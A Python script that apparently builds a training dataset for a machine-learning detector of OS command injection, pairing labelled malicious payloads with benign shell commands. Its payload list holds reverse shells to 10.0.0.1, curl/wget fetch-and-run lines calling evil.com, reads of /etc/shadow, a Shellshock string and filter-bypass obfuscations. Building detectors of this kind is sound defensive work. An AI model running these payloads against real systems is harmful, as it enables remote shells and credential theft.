#!/usr/bin/env python3
"""
Generate OS Command Injection dataset using HexStrike AI payload generation
"""
import sys
import json
import csv
import os
from pathlib import Path
import requests

# HexStrike server endpoint
HEXSTRIKE_SERVER = "http://0.0.0.0:8888"

def call_hexstrike_api(endpoint, data):
    """Call HexStrike API endpoint"""
    try:
        response = requests.post(
            f"{HEXSTRIKE_SERVER}/api/{endpoint}",
            json=data,
            timeout=30
        )
        if response.status_code == 200:
            return response.json()
        else:
            print(f"    Warning: API returned {response.status_code}")
            return None
    except requests.exceptions.ConnectionError:
        print(f"    Warning: Cannot connect to HexStrike server at {HEXSTRIKE_SERVER}")
        return None
    except Exception as e:
        print(f"    Warning: API call failed: {e}")
        return None

def generate_malicious_payloads():
    """Generate malicious command injection payloads using HexStrike"""
    payloads = []
    
    print("Generating malicious command injection payloads...")
    
    # Try to use HexStrike API if available
    hexstrike_available = call_hexstrike_api("health", {}) is not None
    
    if hexstrike_available:
        print("  Using HexStrike AI for payload generation...")
        
        # Configuration for different complexity levels and targets
        configs = [
            # Basic command injection
            {'attack_type': 'cmd_injection', 'complexity': 'basic', 'technology': 'linux'},
            {'attack_type': 'cmd_injection', 'complexity': 'basic', 'technology': 'windows'},
            
            # Advanced command injection
            {'attack_type': 'cmd_injection', 'complexity': 'advanced', 'technology': 'linux'},
            {'attack_type': 'cmd_injection', 'complexity': 'advanced', 'technology': 'windows'},
            
            # Bypass techniques
            {'attack_type': 'cmd_injection', 'complexity': 'bypass', 'technology': 'linux'},
        ]
        
        for config in configs:
            print(f"  Generating {config['complexity']} payloads for {config['technology']}...")
            
            result = call_hexstrike_api('ai/generate_payload', config)
            
            if result and result.get('success'):
                payload_data = result.get('ai_payload_generation', {})
                generated_payloads = payload_data.get('payloads', [])
                
                for p in generated_payloads:
                    if isinstance(p, dict) and 'payload' in p:
                        payloads.append(p['payload'])
                    elif isinstance(p, str):
                        payloads.append(p)
    
    # Fallback: Generate comprehensive manual payload list
    if len(payloads) < 50:
        print("  Using manual payload generation (HexStrike not available or limited results)...")
        payloads.extend(generate_manual_command_injection_payloads())
    
    # Deduplicate
    unique_payloads = list(set(payloads))
    print(f"  Generated {len(unique_payloads)} unique malicious payloads")
    
    return unique_payloads

def generate_manual_command_injection_payloads():
    """Generate comprehensive command injection payloads manually"""
    payloads = []
    
    # Common injection commands
    common_cmds = ['id', 'whoami', 'pwd', 'ls', 'cat /etc/passwd', 'uname -a', 'netstat -an']
    
    # Injection vectors
    vectors = [
        # Pipes
        '|{cmd}', '|{cmd}|', '||{cmd}', '| {cmd}', '|{cmd} #',
        # Semicolons
        ';{cmd}', ';{cmd};', '; {cmd}', ';{cmd} #',
        # Ampersands
        '&{cmd}', '&{cmd}&', '&&{cmd}', '& {cmd}', '&{cmd} #',
        # Backticks
        '`{cmd}`', '``{cmd}``',
        # Command substitution
        '$({cmd})', '${{{cmd}}}',
        # Newlines (encoded)
        '%0A{cmd}', '%0A{cmd}%0A', '\\n{cmd}\\n',
        # URL encoded
        '%7C{cmd}', '%3B{cmd}', '%26{cmd}',
    ]
    
    for cmd in common_cmds:
        for vector in vectors:
            payloads.append(vector.format(cmd=cmd))
    
    # Advanced payloads
    advanced = [
        # Shellshock
        '() { :;}; /bin/bash -c "id"',
        '() { :;}; /usr/bin/id',
        
        # Complex chains
        'id; cat /etc/passwd',
        'whoami && cat /etc/shadow',
        'ls -la | grep root',
        
        # Windows
        'cmd /c whoami',
        'cmd.exe /c "dir c:\\"',
        'powershell -Command "Get-Process"',
        '& net user',
        '| type c:\\windows\\win.ini',
        
        # Reverse shells
        'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        'nc -e /bin/bash 10.0.0.1 4444',
        'python -c "import socket..."',
        
        # File operations
        'cat /etc/passwd',
        'cat /etc/shadow',
        'cat c:\\boot.ini',
        'type c:\\windows\\win.ini',
        
        # Network
        'curl http://evil.com | bash',
        'wget http://evil.com/shell.sh | sh',
        'curl http://evil.com/backdoor > /tmp/bd && chmod +x /tmp/bd && /tmp/bd',
        
        # Encoded/obfuscated
        'cat</etc/passwd',
        'cat${IFS}/etc/passwd',
        'cat$IFS$9/etc/passwd',
        '/???/??t /???/??ss??',
        
        # Time-based
        'id && sleep 10',
        'whoami; ping -c 10 127.0.0.1',
    ]
    
    payloads.extend(advanced)
    
    return payloads

def generate_benign_commands():
    """Generate benign, safe shell commands"""
    benign = [
        # Basic commands
        "ls", "ls -la", "ls -lh", "ls /home", "ls -R",
        "pwd", "cd /tmp", "cd ..", "cd ~",
        "cat file.txt", "cat README.md", "cat /proc/version",
        "echo 'hello'", "echo test", "echo $PATH",
        "grep pattern file.txt", "grep -r search /path", "grep -i case",
        "find . -name '*.txt'", "find /tmp -type f",
        "wc -l file.txt", "wc -w document.txt",
        "head file.txt", "head -n 10 log.txt",
        "tail -f /var/log/syslog", "tail -n 20 error.log",
        "sort file.txt", "sort -r data.csv",
        "uniq data.txt", "uniq -c file.txt",
        "diff file1 file2", "diff -u old new",
        "chmod 644 file.txt", "chmod +x script.sh",
        "chown user:group file", "chown -R user /path",
        "mkdir newfolder", "mkdir -p path/to/dir",
        "rmdir empty_folder", "rm file.txt", "rm -f temp.log",
        "cp source dest", "cp -r /src /dest",
        "mv old new", "mv file /path/",
        "touch newfile.txt", "touch -t 202301010000 file",
        "date", "date +%Y-%m-%d", "date -u",
        "whoami", "id", "uname -a", "hostname",
        
        # File viewing
        "less file.txt", "more document.txt", "cat /etc/os-release",
        
        # Compression
        "tar -xzf archive.tar.gz", "tar -czf backup.tar.gz /data",
        "zip archive.zip file1 file2", "unzip archive.zip",
        "gzip file.txt", "gunzip file.gz",
        
        # Network (safe reads)
        "ping -c 4 google.com", "ping 8.8.8.8",
        "curl https://api.example.com/status", "curl -I https://example.com",
        "wget https://example.com/file.txt",
        "dig example.com", "nslookup google.com",
        "traceroute 8.8.8.8", "netstat -tuln",
        
        # Process management
        "ps aux", "ps -ef", "top", "htop",
        "kill 1234", "killall process_name",
        
        # Disk usage
        "df -h", "du -sh /path", "du -h --max-depth=1",
        
        # Development
        "git status", "git log", "git diff", "git branch",
        "python script.py", "python3 -m pip list", "python --version",
        "node app.js", "npm install", "npm test",
        "make", "make clean", "make install",
        "gcc -o program source.c", "g++ -o app main.cpp",
        
        # Text processing
        "awk '{print $1}' file.txt", "sed 's/old/new/g' file.txt",
        "cut -d',' -f1 data.csv", "paste file1 file2",
        
        # System info
        "uptime", "free -h", "lscpu", "lsblk",
        "dmesg | tail", "systemctl status nginx",
        
        # Package management
        "apt update", "apt list --installed", "apt show package",
        "dpkg -l", "dpkg -s package_name",
        "yum list installed", "rpm -qa",
        
        # Archives
        "zip -r backup.zip /data", "7z x archive.7z",
        
        # Misc safe operations
        "history", "env", "printenv", "which python",
        "man ls", "help cd", "info grep",
        "alias ll='ls -la'", "export VAR=value",
        "source ~/.bashrc", "source venv/bin/activate",
    ]
    
    print(f"Generated {len(benign)} benign commands")
    return benign

def save_dataset(output_file, malicious, benign):
    """Save dataset to CSV"""
    print(f"\nSaving dataset to {output_file}...")
    
    with open(output_file, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['sentence', 'Label'])
        
        # Write malicious (Label=1)
        for payload in malicious:
            writer.writerow([payload, 1])
        
        # Write benign (Label=0)
        for cmd in benign:
            writer.writerow([cmd, 0])
    
    print(f"✅ Saved {len(malicious)} malicious + {len(benign)} benign = {len(malicious) + len(benign)} total samples")

def main():
    output_dir = Path('/home/kali/os-command-injection-ml/data')
    output_dir.mkdir(parents=True, exist_ok=True)
    output_file = output_dir / 'generated_command_injection_dataset.csv'
    
    print("=" * 60)
    print("Generating OS Command Injection Training Dataset")
    print("=" * 60)
    
    # Generate datasets
    malicious = generate_malicious_payloads()
    benign = generate_benign_commands()
    
    # Save
    save_dataset(output_file, malicious, benign)
    
    print("\n" + "=" * 60)
    print("Dataset Statistics:")
    print("=" * 60)
    print(f"Malicious samples: {len(malicious)}")
    print(f"Benign samples: {len(benign)}")
    print(f"Total samples: {len(malicious) + len(benign)}")
    print(f"Class balance: {len(benign) / (len(malicious) + len(benign)) * 100:.1f}% benign")
    print("\nSample malicious payloads:")
    for p in malicious[:5]:
        print(f"  - {p}")
    print("\nDataset ready for TF-IDF + Logistic Regression training!")
    print(f"File: {output_file}")

if __name__ == "__main__":
    main()
